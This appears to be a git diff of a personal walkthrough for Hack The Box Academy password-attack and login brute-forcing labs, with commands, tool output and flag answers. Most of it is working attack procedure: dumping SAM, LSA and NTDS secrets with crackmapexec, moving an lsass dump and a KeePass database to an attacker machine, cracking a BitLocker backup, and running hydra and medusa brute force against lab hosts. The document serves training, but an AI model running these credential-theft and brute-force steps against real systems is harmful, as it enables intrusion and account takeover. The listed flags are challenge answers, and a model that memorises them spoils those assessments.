@@ -25,7 +25,6 @@ sudo nmap -sC -sV -p8080 $ip
 **Results**: Apache Tomcat
 
 
-
 **Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**
 
 ```
@@ -2392,7 +2391,7 @@ sudo hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rocky
 
 ```
 # Another way to do it is running crackmapexec from the attacking machine:
-crackmapexec smb 10.129.77.211 --local-auth -u bob -p HTB_@cademy_stdnt! --sam  
+crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --sam  
 ```
 
 Results:  matrix
@@ -2401,7 +2400,7 @@ Results:  matrix
 **RDP to  with user "Bob" and password "HTB_@cademy_stdnt!". Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)**
 
 ```
-crackmapexec smb 10.129.77.211 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+crackmapexec smb $ip --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 ```
 
 Results: frontdesk:Password123
@@ -2420,7 +2419,7 @@ Results:  lsass.exe
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~/borrar   
 
 # From the RDP connection open a powershell with Admin rights:
-move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP  \\10.10.15.90\CompData
+move C:\Users\HTB-ST~1\AppData\Local\Temp\lsass.DMP  \\$ipKali$\CompData
 
 # Crack the lsass file withPypykatz
 pypykatz lsa minidump ~/borrar/lsass.DMP 
@@ -2496,10 +2495,10 @@ cd username-anarchy
 
 # Save these names under usernames.txt
 # Enumerate services
- sudo nmap -sC -sV 10.129.202.85 -Pn 
+ sudo nmap -sC -sV $ip -Pn 
 
 # Run a password attack:
-crackmapexec winrm 10.129.202.85 -u ~/borrar/usernames.txt -p /usr/share/wordlists/fasttrack.txt --sam
+crackmapexec winrm $ip -u ~/borrar/usernames.txt -p /usr/share/wordlists/fasttrack.txt --sam
 
 # Results:
 SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
@@ -2513,7 +2512,7 @@ Results: jmarston:P@ssword!
 
 ```bash
 # Alternative 1: crackmapexec
-crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds 
+crackmapexec smb $ip-u jmarston -p P@ssword! --ntds 
 
 # Crack the hash
 hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt 
@@ -2523,7 +2522,7 @@ hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.tx
 #  Alternative 2
 
 # 1. Connecting to a DC with Evil-WinRM
-evil-winrm -i 10.129.202.85 -u jmarston -p 'P@ssword!'
+evil-winrm -i $ip -u jmarston -p 'P@ssword!'
 
 # 2. Checking Local Group Membership
 net localgroup
@@ -2683,7 +2682,7 @@ echo LoveYou1 > originalpass.txt
 hashcat --force originalpass.txt -r custom.rule --stdout | sort -u > mutatedlist.list
 
 # Now we launch our attack:
-hydra -l kira -P mutatedlist.list ssh://10.129.229.2
+hydra -l kira -P mutatedlist.list ssh://$ip
 # Results: [22][ssh] host: 10.129.229.2   login: kira   password: L0vey0u1!
 
 ssh kira@$ip
@@ -2808,7 +2807,7 @@ Results: JuL1()_SH@re_fl@g
 
 ```powershell
 # We wnumerate the possible IPs for DC fron our RDP connection
-1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
 # It might be 172.16.1.10
 
 # In the running RDP connection we have we will open a powershell terminal as julio, by using mimikatz and a passthehash
@@ -2935,11 +2934,11 @@ Results: DONE
 
 ```
 # Enum services
-nmap -p 22,2222,3389 10.129.32.62                            
+nmap -p 22,2222,3389 $ip                          
 ```
 
 ```
-Nmap scan report for 10.129.32.62
+Nmap scan report 
 Host is up (0.16s latency).
 
 PORT     STATE  SERVICE
@@ -3179,14 +3178,15 @@ Our client Inlanefreight contracted us to assess individual hosts in their netwo
 
 ```powershell
 # Enumerate services
-sudo nmap -sC -sV 10.129.202.219 -Pn 
+sudo nmap -sC -sV  $ip -Pn 
 # Output: port 21 and 22
 
 # Download the resources files with userlist and password list and generated a mutated list:
 hashcat --force password.list -r custom.rule --stdout | sort -u > mutatedlist.list
 
 # Launch a password attack with the username.list and password.list resource provided
-hydra -L username.list -P password.list ftp://10.129.202.219 # output: [21][ftp] host: 10.129.202.219   login: mike   password: 7777777
+hydra -L username.list -P password.list ftp://$ip
+# output: [21][ftp] host: $ip  login: mike   password: 7777777
 
 # Now we access the ftp service with the creds
 ftp $ip
@@ -3232,15 +3232,15 @@ sudo nmap -sC -sV $ip -Pn
 hashcat --force password.list -r custom.rule --stdout > mut_password.list
 
 # Use a password attack with cracmapexec and the smb service
-crackmapexec smb 10.129.153.184 -u username.list -p mut_password.list
+crackmapexec smb $ip -u username.list -p mut_password.list
 # Output: SMB         10.129.153.184  445    SKILLS-MEDIUM    [+] \john:123456 
 
 # Enumerate samba services with user john
-smbclient -L 10.129.153.184 -U john
+smbclient -L $ip -U john
 # Enter password: 123456
 
 # Access the service
-smbclient \\\\10.129.153.184\\SHAREDRIVE -U john
+smbclient \\\\$ip\\SHAREDRIVE -U john
 # Enter password: 123456
 
 # Enumerate and download zip file
@@ -3333,11 +3333,121 @@ hydra -l johanna -P unique_passwords.list -t 64 -w 2 -f  rdp://$ip
 # Connect to the host via RDP
 xfreerdp /u:johanna  /p:'1231234!' /v:$ip /cert:ignore 
 
+# Browsing around we spot the file Logins.kdbx, a typical keepass file. We will transfer it to our kali machine to try to crack it offline:
+
+# 1. From the kali machine, we will serve the PSUpload.ps1 script
+python3 -m http.server 8001
+
+# 2. From the RDP connection we will download the PSUpload.ps1 to c:\Users\johanna\Documents. Open a powershell
+cd c:\Users\johanna\Documents
+Invoke-WebRequest http://$ipKali:8001/PSUpload.ps1 -Outfile PSUpload.ps1
+
+# 3. From the kali machine, launch uploadserver. It will listen on port 8000
+python3 -m uploadserver
+
+# 4. From the RDP connection, import the PSUpload module and upload the keepass file to our kali attacking machien:
+Import-Module .\PSUpload.ps1
+Invoke-FileUpload -Uri http://$ipAttackingmachien:8000/upload -File C:\Users\johanna\Documents\Logins.kdbx
+
+# From attacking machine, use the module keepass2john to extract a hash:
+keepass2john Logins.kdbx > keepass.hashes
+
+# Launch a dictionary attack:
+john --wordlist=mut_password.list keepass.hashes 
+# Output: Qwerty7!
+
+# Now in the RDP connection, open the keepass file and enter the masterkey. You will access to the creds:
+# david:gRzX7YbeTcDG7
+
+# With these creds we can access the samba share service. We enumerate and access
+smbmap -H $ip -U david
+smbclient \\\\$ip\\david -U david
+
+# We list and note an interesting file. Download it.
+dir
+get Backup.vhd
+
+# Now we will try to crack it. First we will extract the hashes
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+
+# And now we crack it
+hashcat -m 22100 backup.hash mut_password.list -o backup.cracked 
+cat backup.cracked
+# Output: 123456789!
+
+
+# Install the libguestfs-tools package, which provides tools for accessing and manipulating virtual disk images (e.g., .vhd files).
+sudo apt-get install libguestfs-tools
+
+# Install the cifs-utils package, which is used for mounting SMB (CIFS) network shares.
+sudo apt-get install cifs-utils
+
+# Install the dislocker package, which is used for accessing BitLocker-encrypted drives on Linux.
+sudo apt install dislocker
+
+# Create directories where the BitLocker volume and its decrypted contents will be mounted.
+sudo mkdir /media/backup_bitlocker /media/mount  
+
+# Attach the .vhd file located at /mnt/smbshare/backup.vhd to a loop device (/dev/loop100) 
+# and scan for partitions (using the -P flag).
+sudo losetup -P /dev/loop100 /mnt/smbshare/backup.vhd  
+
+# Use dislocker to unlock the BitLocker-encrypted partition (/dev/loop100p2). 
+# The -v flag enables verbose output, -V specifies the BitLocker partition, 
+# and -u prompts for the BitLocker password. The decrypted data is mounted to /media/backup_bitlocker.
+sudo dislocker -v -V /dev/loop100p2 -u -- /media/backup_bitlocker  
+
+# Mount the dislocker-file (the virtual decrypted representation of the BitLocker drive) as a loop device and make it writable. The contents will be accessible at /media/mount.
+sudo mount -o loop,rw /media/backup_bitlocker/dislocker-file /media/mount  
+
+# List the contents of the decrypted and mounted BitLocker volume to verify the files are accessible.
+ls -la /media/mount
 ```
 
-Results:
+
+```
+# Output
+total 19104
+drwxrwxrwx 1 root root        0 Feb 11  2022 '$RECYCLE.BIN'
+drwxrwxrwx 1 root root     4096 Feb 11  2022  .
+drwxr-xr-x 6 root root     4096 Jan 20 17:25  ..
+-rwxrwxrwx 1 root root    77824 Feb 11  2022  SAM
+-rwxrwxrwx 1 root root 19472384 Feb 11  2022  SYSTEM
+drwxrwxrwx 1 root root     4096 Feb 11  2022 'System Volume Information'
+```
 
 
+```
+# We can use secretsdump to extract the hives:
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL 
+```
+
+```
+[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e53d4d912d96874e83429886c7bf22a1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
+sshd:1000:aad3b435b51404eeaad3b435b51404ee:6ba6aae01bae3868d8bf31421d586153:::
+david:1009:aad3b435b51404eeaad3b435b51404ee:b20d19ca5d5504a0c9ff7666fbe3ada5:::
+johanna:1010:aad3b435b51404eeaad3b435b51404ee:0b8df7c13384227c017efc6db3913374:::
+[*] Cleaning up... 
+```
+
+```
+# Cracking the Administrator NTLM
+hashcat -m 1000 e53d4d912d96874e83429886c7bf22a1 mut_passwords.list
+# Output: Liverp00l8!
+
+# Access with RDP
+xfreerdp /u:Administrator  /p:'Liverp00l8!' /v:$ip /cert:ignore
+
+# Open the flag.txt in the Desktop
+```
+
+Results: HTB{PWcr4ck1ngokokok}
 
 
 
@@ -6220,6 +6330,183 @@ Results:  HTB{w3b_fuzz1n6_m4573r}
 
 
 ## [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)
+
+
+### Brute Force Attacks
+
+**After successfully brute-forcing the PIN, what is the full flag the script returns?**
+
+Run the provided script. Also you can do it from Burpsuite.
+
+Results: HTB{Brut3_F0rc3_1s_P0w3rfu1}
+
+
+**After successfully brute-forcing the target using the script, what is the full flag the script returns?**
+
+Run the provided script. Also you can do it from Burpsuite.
+
+HTB{Brut3_F0rc3_M4st3r}
+
+
+### Hydra
+
+**Basic HTTP Authentication- After successfully brute-forcing, and then logging into the target, what is the full flag you find?**
+
+```
+hydra -l basic-auth-user -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 94.237.63.111 -s 32110 http-get / 
+```
+
+Results: HTB{th1s_1s_4_f4k3_fl4g}
+
+**Login Forms- After successfully brute-forcing, and then logging into the target, what is the full flag you find?**
+
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.63.111 -s 47017 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+# Output: [47017][http-post-form] host: 94.237.63.111   login: admin   password: zxcvbnm
+
+```
+
+Results: HTB{W3b_L0gin_Brut3F0rc3}
+
+
+### Medusa
+
+What was the password for the ftpuser?
+
+```
+medusa -u sshuser -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -M ssh -h 83.136.253.44 -n 45938 -t 3
+# Output: 2025-01-20 19:57:42 ACCOUNT FOUND: [ssh] Host: 83.136.253.44 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
+
+# Connect via ssh
+ssh sshuser@83.136.253.44 -p 45938
+
+# Reconnaissance
+nmap localhost
+
+# From the local target machine:
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+# Output: ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: qqww1122 [SUCCESS]
+
+# From the target machine connect to FTP
+ftp ftpuser@$ip
+# Enter password: qqww1122
+dir 
+get flag.txt
+quit
+
+cat flag.txt
+```
+
+Results: qqww1122
+
+**After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?**
+
+Results: HTB{SSH_and_FTP_Bruteforce_Success}
+
+
+### Custom Wordlists
+
+**After successfully brute-forcing, and then logging into the target, what is the full flag you find?**
+
+
+```
+# Generate usernames
+./username-anarchy Jane Smith > jane_smith_usernames.txt
+
+# Generate passwords
+cupp -i 
+```
+
+```
+Output
+> First Name: Jane
+> Surname: Smith
+> Nickname: Janey
+> Birthdate (DDMMYYYY): 11121990
+
+
+> Partners) name: Jim
+> Partners) nickname: Jimbo
+> Partners) birthdate (DDMMYYYY): 12121990
+
+
+> Child's name: 
+> Child's nickname: 
+> Child's birthdate (DDMMYYYY): 
+
+
+> Pet's name: Spot
+> Company name: AHI
+
+
+> Do you want to add some key words about the victim? Y/[N]: y
+> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,juice,black], spaces will be removed: hacker,blue
+> Do you want to add special chars at the end of words? Y/[N]: y
+> Do you want to add some random numbers at the end of words? Y/[N]:y
+> Leet mode? (i.e. leet = 1337) Y/[N]: y
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to jane.txt, counting 52058 words.
+[+] Now load your pistolero with jane.txt and shoot! Good luck!
+```
+
+```
+# Filter passwords
+grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > dictionary-filtered.txt
+
+# Launch hydra attack:
+hydra -L jane_smith_usernames.txt -P dictionary-filtered.txt 94.237.50.7 -s 32234 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+
+# Output: [32234][http-post-form] host: 94.237.50.7   login: jane   password: 3n4J!!
+
+# Login into the target
+```
+
+Results: HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}
+
+
+### Skills Assessment Part 1
+
+The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.
+
+**What is the password for the basic auth login?**
+
+```bash
+# We have the provided lists: usernames.txt and passwords.txt
+hydra -L usernames.txt -P passwords.txt -f 83.136.253.44 -s 44641 http-get 
+
+# Output: [44641][http-get] host: 83.136.253.44   login: admin   password: Admin123
+
+```
+
+
+Results: Admin123
+
+**After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?**
+
+```bash
+# Access the site with user and password and the name is retrieved
+```
+
+Results: satwossh
+
+
+
+### Skills Assessment Part 2
+
+This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.
+
+What is the username of the ftp user you find via brute-forcing?
+
+```
+sudo nmap -sV -sC $ip -Pn -p-
+
+```
+
+
+What is the flag contained within flag.txt
+
 
 
 ## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)
